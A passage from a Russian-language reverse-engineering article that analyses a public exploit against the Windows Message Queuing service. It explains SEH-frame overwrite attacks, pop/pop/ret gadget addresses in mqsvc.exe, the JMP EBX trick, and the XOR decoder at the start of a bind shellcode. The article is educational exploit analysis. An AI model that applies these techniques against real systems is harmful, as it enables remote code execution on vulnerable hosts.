      <text:p text:style-name="P32">Листинг <text:sequence text:ref-name="refЛистинг1" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">2</text:sequence> массив <text:span text:style-name="T1">offsets</text:span> хранит подложные <text:span text:style-name="T1">SEH</text:span>-фреймы для нескольких операционных систем, передающие управление на <text:span text:style-name="T1">shell</text:span>-код</text:p>
      <text:p text:style-name="P22">В начале массива расположена довольно характерная структура, состоящая из двух двойных слов, первое из которых включает в себя двухбайтовую команду безусловного перехода <text:span text:style-name="T1">JMP SHORT</text:span> (опкод— <text:span text:style-name="T1">EBh</text:span>), дополненную до двойного слова парой <text:span text:style-name="T1">NOP</text:span>'ов (впрочем, поскольку, они все равно не исполняются, здесь может быть все, что угодно). Следующее двойное слово указывает куда-то вглубь адресного пространства — 004014<text:span text:style-name="T1">E</text:span>9<text:span text:style-name="T1">h</text:span> и, судя по значению, принадлежит прикладному приложению. В данном случае — программе mqsvc.exe, реализующей службу <text:span text:style-name="T1">Message Queuing</text:span>. Комментарий, заботливо оставленный создателем <text:span text:style-name="T1">exploit</text:span>'а, говорит, что по этому адресу он ожидает увидеть конструкцию <text:span text:style-name="T2">pop</text:span><text:span text:style-name="T10"> </text:span><text:span text:style-name="T2">reg</text:span><text:span text:style-name="T10">/</text:span><text:span text:style-name="T2">pop</text:span><text:span text:style-name="T10"> </text:span><text:span text:style-name="T2">reg</text:span><text:span text:style-name="T10">/</text:span><text:span text:style-name="T2">retn</text:span>. Это — классическая последовательность, используемая для передачи управления через подложные <text:span text:style-name="T1">SEH</text:span>-фреймы, подробно описанная в статье "Эксплуатирование SEH в среде Win32" (http://www.securitylab.ru/contest/212085.php), написанной houseofdabus'ом. Он же написал и разбираемый нами <text:span text:style-name="T1">exploit</text:span>.</text:p>
      <text:p text:style-name="P22">Допустим, никакого комментария у нас бы не было. И что тогда? Загружаем mqsvc.exe в <text:span text:style-name="T1">hiew</text:span>, двойным нажатием <text:span text:style-name="T1">ENTER</text:span>'а переходим в дизассемблерный режим, давим &lt;<text:span text:style-name="T1">F</text:span>5&gt; и вводим адрес ".4014<text:span text:style-name="T1">E</text:span>9" (точка указывает, что это именно адрес, а не смещение).</text:p>
      <text:p text:style-name="P22">Видим<text:span text:style-name="T1">:</text:span></text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P1"><text:span text:style-name="T18">.004014</text:span><text:span text:style-name="T15">E</text:span><text:span text:style-name="T18">9: 5</text:span><text:span text:style-name="T15">F</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">pop</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">edi</text:span><text:span text:style-name="T18"><text:tab/>; вытолкнуть одно двойное слово из стека</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T18">.004014</text:span><text:span text:style-name="T15">EA</text:span><text:span text:style-name="T18">: 5</text:span><text:span text:style-name="T15">E</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">pop</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">esi</text:span><text:span text:style-name="T18"><text:tab/>; вытолкнуть следующее двойное слово</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T13">.004014</text:span><text:span text:style-name="T14">EB</text:span><text:span text:style-name="T13">: </text:span><text:span text:style-name="T14">C</text:span><text:span text:style-name="T13">3<text:tab/></text:span><text:span text:style-name="T14">retn</text:span><text:span text:style-name="T13"><text:tab/><text:tab/>; выткнуть адрес возврата и передать по нему управление</text:span></text:p>
      <text:p text:style-name="P32">Листинг <text:sequence text:ref-name="refЛистинг2" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">3</text:sequence> последовательность pop reg/pop reg/retn, содержащаяся в mqsvc.exe файле</text:p>
      <text:p text:style-name="P22">Естественно, данный способ не универсален и вообще говоря ненадежен, поскольку, в другой версии mqsvc.exe адрес "магической" последовательности наверняка будет иной, хотя в <text:span text:style-name="T1">Windows</text:span> 2000 <text:span text:style-name="T1">Home</text:span>, <text:span text:style-name="T1">Windows</text:span> 2000 <text:span text:style-name="T1">Professional</text:span>, <text:span text:style-name="T1">Windows</text:span> 2000 Server/AdvServer адреса совпадают, поскольку используется одна и та же версия mqsvc.exe, а вот в <text:span text:style-name="T1">Windows XP</text:span> адрес уже "уплывает".</text:p>
      <text:p text:style-name="P22">Интуитивно мы чувствуем, что передача управления на <text:span text:style-name="T1">shell</text:span>-код осуществляется через <text:span text:style-name="T1">RET</text:span>, но остается непонятным каким образом указатель на <text:span text:style-name="T1">shell</text:span>-код мог очутиться в стеке, ведь никто туда его явно не засылал! Запихать в переполняющийся буфер можно все, что угодно, но при этом придется указать точный адрес размещения <text:span text:style-name="T1">shell</text:span>-кода в памяти, а для этого необходимо знать значение регистра <text:span text:style-name="T1">ESP</text:span> на момент атаки, а оно в общем случае неизвестно.</text:p>
      <text:p text:style-name="P22">Структурные исключения позволяют элегантно решить эту задачу. Вместо того, чтобы затирать адрес возврата (как делало это целое поклонение кодокопателей), мы подменяем оригинальный <text:span text:style-name="T1">SEH</text:span>-фрейм атакуемой программы своим. Теоретически, <text:span text:style-name="T1">SEH</text:span>-фреймы могут быть расположены в любом месте, но практически все известные компиляторы размещают их в стеке, на вершине кадра функции, то есть по соседству с сохраненным <text:span text:style-name="T1">EPB</text:span> и <text:span text:style-name="T1">RET</text:span>'ом:</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P1"><text:span text:style-name="T18">.</text:span><text:span text:style-name="T15">text</text:span><text:span text:style-name="T18">:0040104</text:span><text:span text:style-name="T15">D</text:span><text:span text:style-name="T18"><text:tab/><text:tab/></text:span><text:span text:style-name="T15">push</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">ebp</text:span><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/>; открыть новый...</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T15">.text:0040104E<text:tab/><text:tab/>mov<text:tab/>ebp, esp<text:tab/><text:tab/>;<text:tab/><text:tab/>...</text:span><text:span text:style-name="T18">кадр</text:span><text:span text:style-name="T15"> </text:span><text:span text:style-name="T18">стека</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T15">.text:00401050<text:tab/><text:tab/>push<text:tab/>0FFFFFFFFh<text:tab/><text:tab/>; </text:span><text:span text:style-name="T18">это</text:span><text:span text:style-name="T15"> </text:span><text:span text:style-name="T18">последний</text:span><text:span text:style-name="T15"> SEH-</text:span><text:span text:style-name="T18">фрейм</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T15">.text:00401052<text:tab/><text:tab/>push<text:tab/>offset stru_407020<text:tab/>; </text:span><text:span text:style-name="T18">предшествующий</text:span><text:span text:style-name="T15"> SEH-</text:span><text:span text:style-name="T18">обработчик</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">.text:00401057<text:tab/><text:tab/>push<text:tab/>offset _except_handler3; </text:span><text:span text:style-name="T13">новый</text:span><text:span text:style-name="T14"> SEH-</text:span><text:span text:style-name="T13">обработчик</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T18">.</text:span><text:span text:style-name="T15">text</text:span><text:span text:style-name="T18">:0040105</text:span><text:span text:style-name="T15">C</text:span><text:span text:style-name="T18"><text:tab/><text:tab/></text:span><text:span text:style-name="T15">mov</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">eax</text:span><text:span text:style-name="T18">, </text:span><text:span text:style-name="T15">large</text:span><text:span text:style-name="T18"> </text:span><text:span text:style-name="T15">fs</text:span><text:span text:style-name="T18">:0<text:tab/>; получить указатель на </text:span><text:span text:style-name="T15">SEH</text:span><text:span text:style-name="T18">-фрейм</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T13">.</text:span><text:span text:style-name="T14">text</text:span><text:span text:style-name="T13">:00401062<text:tab/><text:tab/></text:span><text:span text:style-name="T14">push</text:span><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">eax</text:span><text:span text:style-name="T13"><text:tab/><text:tab/><text:tab/>; предыдущий </text:span><text:span text:style-name="T14">SEH</text:span><text:span text:style-name="T13">-обработчик</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T13">.</text:span><text:span text:style-name="T14">text</text:span><text:span text:style-name="T13">:00401063<text:tab/><text:tab/></text:span><text:span text:style-name="T14">mov</text:span><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">large</text:span><text:span text:style-name="T13"> </text:span><text:span text:style-name="T14">fs</text:span><text:span text:style-name="T13">:0, </text:span><text:span text:style-name="T14">esp</text:span><text:span text:style-name="T13"><text:tab/>; зарегистрировать новый </text:span><text:span text:style-name="T14">SEH</text:span><text:span text:style-name="T13">-фрейм</text:span></text:p>
      <text:p text:style-name="P32"><text:soft-page-break/>Листинг <text:sequence text:ref-name="refЛистинг3" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">4</text:sequence> фрагмент функции, формирующий новый <text:span text:style-name="T1">SEH</text:span>-фрейм (компилятор — <text:span text:style-name="T1">Microsoft</text:span> <text:span text:style-name="T1">Visual</text:span> <text:span text:style-name="T1">C</text:span>++)</text:p>
      <text:p text:style-name="P22">Отсюда: если мы можем затереть адрес возврата, подмена <text:span text:style-name="T1">SEH</text:span>-фрейма не составит никаких проблем!</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P32">Рисунок<text:span text:style-name="T1"> </text:span><text:sequence text:ref-name="refDrawing1" text:name="Drawing" text:formula="ooow:Drawing+1" style:num-format="1">2</text:sequence><text:span text:style-name="T1"> </text:span>расположение <text:span text:style-name="T1">SEH</text:span>-фреймов относительно переполняющихся буферов</text:p>
      <text:p text:style-name="P22">Сама структура фреймов проста до безобразия:</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P1"><text:span text:style-name="T15">struct EXCEPTION_REGISTRATION</text:span></text:p>
      <text:p text:style-name="P4">{</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T15">/* 00h */ EXCEPTION_REGISTRATION<text:tab/>*prev;<text:tab/><text:tab/>// </text:span><text:span text:style-name="T18">предыдущий</text:span><text:span text:style-name="T15"> SEH-</text:span><text:span text:style-name="T18">фрейм</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T18">/* 04</text:span><text:span text:style-name="T15">h</text:span><text:span text:style-name="T18"> */ </text:span><text:span text:style-name="T15">DWORD</text:span><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/>*</text:span><text:span text:style-name="T15">handler</text:span><text:span text:style-name="T18">;<text:tab/>// обработчик исключения</text:span></text:p>
      <text:p text:style-name="P4">};</text:p>
      <text:p text:style-name="P32">Листинг <text:sequence text:ref-name="refЛистинг4" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">5</text:sequence> структура <text:span text:style-name="T1">SEH</text:span>-фреймов</text:p>
      <text:p text:style-name="P22">Первое двойное слово указывает на предыдущий <text:span text:style-name="T1">SEH</text:span>-фрейм в цепочке (если текущий обработчик не знает, что делать с исключением, он отдает его предыдущему обработчику; если ни один из обработчиков не может обработать исключение, операционная система выбрасывает знаменитое сообщение о критической ошибке и завершает работу приложения в аварийном режиме).</text:p>
      <text:p text:style-name="P22">Следующее двойное слово — содержит адрес процедуры обработчика исключений (не путать с функцией-фильтром исключений, которая обслуживаться не операционной системой, а компилятором!). Очень заманчиво записать сюда указатель на <text:span text:style-name="T1">shell</text:span>-код, но вся проблема в том, что этого указателя мы не знаем и в общем случае не можем узнать! На самом деле, ситуация не так уж плачевна.</text:p>
      <text:p text:style-name="P22">Рассмотрим процесс обработки исключений повнимательнее. В тот момент, когда прикладной код пытается сделать что-то недопустимое, процессор генерирует прерывание. Операционная система перехватывает его и передает внутренней функции <text:span text:style-name="T22">KiUserExceptionDispatcher</text:span>, содержащейся внутри <text:span text:style-name="T1">NTDLL</text:span>.<text:span text:style-name="T1">DLL</text:span>. Та в свою очередь вызывает промежуточную функцию <text:span text:style-name="T22">RtlUnwind</text:span> (все из той же <text:span text:style-name="T1">NTDLL</text:span>.<text:span text:style-name="T1">DLL</text:span>), передающую управление фильтру исключений, установленным компилятором (в случае <text:span text:style-name="T1">Microsoft</text:span> <text:span text:style-name="T1">Visual</text:span> <text:span text:style-name="T1">C</text:span>++ эта функция называется <text:span text:style-name="T21">__</text:span><text:span text:style-name="T22">except</text:span><text:span text:style-name="T21">_</text:span><text:span text:style-name="T22">handler</text:span><text:span text:style-name="T21">3</text:span>), которая и вызывает прикладной обработчик, зарегистрированный программистом уязвимого приложения.</text:p>
      <text:p text:style-name="P22">Короче, получается следующая цепочка вызовов:</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P14">NTDLL.DLL!KiUserExceptionDispatcher -&gt; NTDLL.DLL!RtlUnwind —&gt;__except_handler3</text:p>
      <text:p text:style-name="P32">Листинг <text:sequence text:ref-name="refЛистинг5" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">6</text:sequence> последовательность вызова функций при обработке исключения</text:p>
      <text:p text:style-name="P22">В <text:span text:style-name="T1">Windows </text:span>2000 функция <text:span text:style-name="T23">NTDLL</text:span><text:span text:style-name="T20">.</text:span><text:span text:style-name="T23">DLL</text:span><text:span text:style-name="T20">!</text:span><text:span text:style-name="T23">RtlUnwind</text:span> оставляет немного "мусора" в регистрах, в результате чего в <text:span text:style-name="T1">EBX</text:span> попадет адрес текущего <text:span text:style-name="T1">SEH</text:span>-фрейма. А это значит, что для достижения задуманной цели мы должны поверх <text:span text:style-name="T20">handler</text:span>'а поместить указатель на команду JMP EBX (FF<text:span text:style-name="T1">h</text:span> E3<text:span text:style-name="T1">h</text:span>) или CALL EBX (FF<text:span text:style-name="T1">h</text:span> D3<text:span text:style-name="T1">h</text:span>), которую можно найти как в самой атакуемой программы, так и в памяти операционной системы (естественно, адрес будет "плавать" от версии к версии, что есть неизбежное зло, но с этим надо смириться). Тогда при возникновении исключения управление будет передано на двойное слово, содержащее указатель <text:span text:style-name="T20">prev</text:span>. Да-да! Не по указателю <text:span text:style-name="T1">prev</text:span>, а именно на сам указатель, который следует заменить на <text:span text:style-name="T1">JMP SHORT sell</text:span>‑<text:span text:style-name="T1">code</text:span>. Поскольку, команды перехода в <text:span text:style-name="T1">x</text:span>86-процессорах относительные, знать точное расположение <text:span text:style-name="T1">shell</text:span>-кода в памяти уже необязательно.</text:p>
      <text:p text:style-name="P22">В <text:span text:style-name="T1">Windows XP</text:span> эта лазейка была прикрыта, но! Осталась функция-фильтр <text:span text:style-name="T20">__</text:span><text:span text:style-name="T23">except</text:span><text:span text:style-name="T20">_</text:span><text:span text:style-name="T23">handler</text:span><text:span text:style-name="T20">3</text:span>, входящая в состав <text:span text:style-name="T1">RTL</text:span> компилятора, а потому никак не зависящая от операционной системы. Рассмотрим окрестности дизассемблерного кода, передающего управление на зарегистрированный программистом обработчик.</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P1"><text:span text:style-name="T13">.</text:span><text:span text:style-name="T14">text</text:span><text:span text:style-name="T13">:004012</text:span><text:span text:style-name="T14">D</text:span><text:span text:style-name="T13">1<text:tab/><text:tab/></text:span><text:span text:style-name="T14">mov</text:span><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">esi</text:span><text:span text:style-name="T13">, [</text:span><text:span text:style-name="T14">ebx</text:span><text:span text:style-name="T13">+0</text:span><text:span text:style-name="T14">Ch</text:span><text:span text:style-name="T13">]<text:tab/><text:tab/>; указатель на текущий </text:span><text:span text:style-name="T14">SEH</text:span><text:span text:style-name="T13">-фрейм</text:span></text:p>
      <text:p text:style-name="P4">.text:004012D4<text:tab/><text:tab/>mov<text:tab/>edi, [ebx+8]</text:p>
      <text:p text:style-name="P4">.text:004012D7</text:p>
      <text:p text:style-name="P4">.text:004012D7 unknwn_libname_2:<text:tab/><text:tab/><text:tab/>; CODE XREF: unknwn_libname_1+90↓j</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T18">.</text:span><text:span text:style-name="T15">text</text:span><text:span text:style-name="T18">:004012</text:span><text:span text:style-name="T15">D</text:span><text:span text:style-name="T18"><text:tab/><text:tab/></text:span><text:span text:style-name="T15">cmp</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">esi</text:span><text:span text:style-name="T18">, 0</text:span><text:span text:style-name="T15">FFFFFFFFh</text:span><text:span text:style-name="T18"><text:tab/>; обработчиков больше нет?</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T18">.</text:span><text:span text:style-name="T15">text</text:span><text:span text:style-name="T18">:004012</text:span><text:span text:style-name="T15">DA</text:span><text:span text:style-name="T18"><text:tab/><text:tab/></text:span><text:span text:style-name="T15">jz</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">short</text:span><text:span text:style-name="T18"> </text:span><text:span text:style-name="T15">unknwn</text:span><text:span text:style-name="T18">_</text:span><text:span text:style-name="T15">libname</text:span><text:span text:style-name="T18">_5<text:tab/>; если да, завершаем программу</text:span></text:p>
      <text:p text:style-name="P4">.text:004012DC<text:tab/><text:tab/>lea<text:tab/>ecx, [esi+esi*2]</text:p>
      <text:p text:style-name="P4">.text:004012DF<text:tab/><text:tab/>cmp<text:tab/>dword ptr [edi+ecx*4+4], 0</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T15">.text:004012E4<text:tab/><text:tab/>jz<text:tab/>short unknwn_libname_3 ; Microsoft VisualC 2-7/net</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T13">.</text:span><text:span text:style-name="T14">text</text:span><text:span text:style-name="T13">:004012</text:span><text:span text:style-name="T14">E</text:span><text:span text:style-name="T13">6<text:tab/><text:tab/></text:span><text:span text:style-name="T14">push</text:span><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">esi</text:span><text:span text:style-name="T13"><text:tab/><text:tab/><text:tab/>; сохраняем указатель на фрейм</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T18">.</text:span><text:span text:style-name="T15">text</text:span><text:span text:style-name="T18">:004012</text:span><text:span text:style-name="T15">E</text:span><text:span text:style-name="T18">7<text:tab/><text:tab/></text:span><text:span text:style-name="T15">push</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">ebp</text:span><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/>; сохраняем указатель на кадр</text:span></text:p>
      <text:p text:style-name="P4">.text:004012E8<text:tab/><text:tab/>lea<text:tab/>ebp, [ebx+10h]</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">.text:004012EB<text:tab/><text:tab/>call<text:tab/>dword ptr [edi+ecx*4+4]; </text:span><text:span text:style-name="T13">вызываем</text:span><text:span text:style-name="T14"> </text:span><text:span text:style-name="T13">обработчик</text:span><text:span text:style-name="T14"> </text:span><text:span text:style-name="T13">исключения</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T18">.</text:span><text:span text:style-name="T15">text</text:span><text:span text:style-name="T18">:004012</text:span><text:span text:style-name="T15">EF</text:span><text:span text:style-name="T18"><text:tab/><text:tab/></text:span><text:span text:style-name="T15">pop</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">ebp</text:span><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/>; восстанавливаем кадр</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T18">.</text:span><text:span text:style-name="T15">text</text:span><text:span text:style-name="T18">:004012</text:span><text:span text:style-name="T15">F</text:span><text:span text:style-name="T18">0<text:tab/><text:tab/></text:span><text:span text:style-name="T15">pop</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">esi</text:span><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/>; восстанавливаем фрейм</text:span></text:p>
      <text:p text:style-name="P32">Листинг <text:sequence text:ref-name="refЛистинг6" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">7</text:sequence> фрагмент <text:span text:style-name="T1">RTL</text:span>-функции __except_handler3, сохраняющий указатель на текущий <text:span text:style-name="T1">SEH</text:span>-фрейм перед вызовом обработчика исключения</text:p>
      <text:p text:style-name="P22">Вот оно! Перед вызовом обработчика исключения, функция временно сохраняет указатель на текущий <text:span text:style-name="T1">SEH</text:span>-фрейм в стеке (команда <text:span text:style-name="T1">PUSH ESI</text:span>), который на момент вызова обработка будет расположен по смещению +8<text:span text:style-name="T1">h</text:span>. Причем, исправить это средствами операционной системы никак невозможно! Необходимо переписать <text:span text:style-name="T1">RTL</text:span> каждого из компиляторов и перекомпилировать все программы!</text:p>
      <text:p text:style-name="P22">Для реализации атаки достаточно заменить <text:span text:style-name="T23">handler</text:span> указателем на последовательность <text:span text:style-name="T1">pop reg</text:span>/<text:span text:style-name="T1">pop reg</text:span>/<text:span text:style-name="T1">ret</text:span> или <text:span text:style-name="T1">add</text:span> <text:span text:style-name="T1">esp</text:span>, 8/<text:span text:style-name="T1">ret</text:span> (которая достаточно часто встречаются в эпилогах функций), а поверх <text:span text:style-name="T23">prev</text:span> как и раньше записать <text:span text:style-name="T1">jump</text:span> на <text:span text:style-name="T1">shell</text:span>-код. Первая команда <text:span text:style-name="T1">pop</text:span> сталкивает с вершины стека уже ненужный адрес возврата, оставленный <text:span text:style-name="T1">call</text:span>, вторая — выбрасывает сохраненный регистр <text:span text:style-name="T1">EBP</text:span>, а <text:span text:style-name="T1">ret</text:span> передает управление на текущий <text:span text:style-name="T1">SEH</text:span>-фрейм.</text:p>
      <text:p text:style-name="P22">Теперь структура массива <text:span text:style-name="T23">offsets</text:span> становится более или менее понятна. Мы видим три подложных <text:span text:style-name="T1">SEH</text:span>-фрейма — по одному для каждой операционной системы, расположенных в памяти с таким расчетом, чтобы они совпадали с текущими <text:span text:style-name="T1">SEH</text:span>-фреймами атакуемой программы. Это самая капризная часть <text:span text:style-name="T1">exploit</text:span>'а, поскольку дислокация фреймов зависит как от версии атакуемой программы (добавление или удаление локальных переменных внутри уязвимой функции изменяет расстояние между фреймом и переполняющимся буфером), так и от начального положения стека на момент запуска программы (за это отвечает операционная система). В дополнении к этому необходимо следить за тем, чтобы <text:span text:style-name="T23">handler</text:span> действительно указывал на <text:span text:style-name="T1">pop reg</text:span>/<text:span text:style-name="T1">pop reg</text:span>/<text:span text:style-name="T1">ret</text:span> (<text:span text:style-name="T1">add esp</text:span>,8/<text:span text:style-name="T1">ret</text:span>), а не на что-то другое. В противном случае, <text:span text:style-name="T1">exploit</text:span> работать не будет, но если все значения подобранны правильно, управление получит <text:span text:style-name="T20">bind_shellcode</text:span>, который мы сейчас попробуем дизассемблировать, но прежде необходимо перевести <text:span text:style-name="T1">ASCII</text:span>-строку в двоичный вид, чтобы его "проглотил" <text:span text:style-name="T1">hiew</text:span> или <text:span text:style-name="T1">IDA PRO</text:span>.</text:p>
      <text:p text:style-name="P22">Вместо того, чтобы писать конвертор с нуля, воспользуемся возможностями компилятора языка Си, написав несложную программу, состоящую фактически всего из одной строки (остальные — объявления):</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P4">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">char</text:span><text:span text:style-name="T13"> </text:span><text:span text:style-name="T14">shellcode</text:span><text:span text:style-name="T13">[]="\</text:span><text:span text:style-name="T14">xXX</text:span><text:span text:style-name="T13">\</text:span><text:span text:style-name="T14">xXX</text:span><text:span text:style-name="T13">\</text:span><text:span text:style-name="T14">xXX</text:span><text:span text:style-name="T13">\</text:span><text:span text:style-name="T14">xXX</text:span><text:span text:style-name="T13">"; <text:tab/>// сюда помещаем массив для преобразования</text:span></text:p>
      <text:p text:style-name="P4">main(){FILE *f;if(f=fopen("shellcode","wb"))fwrite(shellcode, sizeof(shellcode),1,f);}</text:p>
      <text:p text:style-name="P32">Листинг <text:sequence text:ref-name="refЛистинг7" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">8</text:sequence> программа, сохраняющая <text:span text:style-name="T1">ASCII</text:span>-массив <text:span text:style-name="T1">shellcode</text:span>[] в одноименный двоичный файл, пригодный для дизассемблирования</text:p>
      <text:p text:style-name="P22">Выделяем массив <text:span text:style-name="T20">bind_shellcode</text:span> и копируем в нашу программу, по ходу дела переименовывая его в <text:span text:style-name="T23">shellcode</text:span>. Компилируем с настройками по умолчанию, запускаем. На диске образуется файл <text:span text:style-name="T1">shellcode</text:span>, готовый к загрузке в <text:span text:style-name="T1">IDA Pro</text:span> или <text:span text:style-name="T1">hiew</text:span> (только не забудьте переключить дизассемблер в 32-разрядный режим!).</text:p>
      <text:p text:style-name="P22">Начало дизассемблерного листинга выглядят так:</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P3">00000000: 29C9<text:tab/><text:tab/><text:tab/>sub<text:tab/>ecx,ecx<text:tab/><text:tab/>; ECX := 0</text:p>
      <text:p text:style-name="P3">00000002: 83E9B0<text:tab/><text:tab/>sub<text:tab/>ecx,-050<text:tab/>; EBX := 50h</text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T18">00000005: </text:span><text:span text:style-name="T15">D</text:span><text:span text:style-name="T18">9</text:span><text:span text:style-name="T15">EE</text:span><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T15">fldz</text:span><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/>; загрузить +0.0 на стек </text:span><text:span text:style-name="T15">FPU</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T18">00000007: </text:span><text:span text:style-name="T15">D</text:span><text:span text:style-name="T18">97424</text:span><text:span text:style-name="T15">F</text:span><text:span text:style-name="T18">4<text:tab/><text:tab/></text:span><text:span text:style-name="T15">fstenv</text:span><text:span text:style-name="T18"><text:tab/> [</text:span><text:span text:style-name="T15">esp</text:span><text:span text:style-name="T18">][-0</text:span><text:span text:style-name="T15">C</text:span><text:span text:style-name="T18">]<text:tab/>; сохранить среду </text:span><text:span text:style-name="T15">FPU</text:span><text:span text:style-name="T18"> в памяти</text:span></text:p>
      <text:p text:style-name="P3">0000000B: 5B<text:tab/><text:tab/><text:tab/>pop<text:tab/>ebx<text:tab/><text:tab/>; EBX := &amp;fldz</text:p>
      <text:p text:style-name="P5">0000000C: 81731319F50437<text:tab/>xor<text:tab/>d,[ebx][13],03704F519</text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T13">0000000</text:span><text:span text:style-name="T14">C</text:span><text:span text:style-name="T13"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>; ^расшифровываем двойными словами</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T13">00000013: 83</text:span><text:span text:style-name="T14">EBFC</text:span><text:span text:style-name="T13"><text:tab/><text:tab/></text:span><text:span text:style-name="T14">sub</text:span><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">ebx</text:span><text:span text:style-name="T13">,-004 <text:tab/>; </text:span><text:span text:style-name="T14">EBX</text:span><text:span text:style-name="T13"> += 4:следующее двойное слово</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T13">00000016: </text:span><text:span text:style-name="T14">E</text:span><text:span text:style-name="T13">2</text:span><text:span text:style-name="T14">F</text:span><text:span text:style-name="T13">4<text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T14">loop</text:span><text:span text:style-name="T13"><text:tab/>00000000</text:span><text:span text:style-name="T14">C</text:span><text:span text:style-name="T13"> <text:s/>(1)<text:tab/>; мотаем цикл</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T18">00000018: </text:span><text:span text:style-name="T15">E</text:span><text:span text:style-name="T18">59</text:span><text:span text:style-name="T15">F</text:span><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T15">in</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">eax</text:span><text:span text:style-name="T18">,09</text:span><text:span text:style-name="T15">F</text:span><text:span text:style-name="T18"><text:tab/><text:tab/>; зашифрованная команда</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T18">0000001</text:span><text:span text:style-name="T15">A</text:span><text:span text:style-name="T18">: </text:span><text:span text:style-name="T15">EF</text:span><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T15">out</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">dx</text:span><text:span text:style-name="T18">,</text:span><text:span text:style-name="T15">eax</text:span><text:span text:style-name="T18"><text:tab/><text:tab/>; зашифрованная команда</text:span></text:p>
      <text:p text:style-name="P32">Листинг <text:sequence text:ref-name="refЛистинг8" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">9</text:sequence> в начале <text:span text:style-name="T1">shell</text:span>-кода расположен расшифровщик, расшифровывающий весь остальной код</text:p>
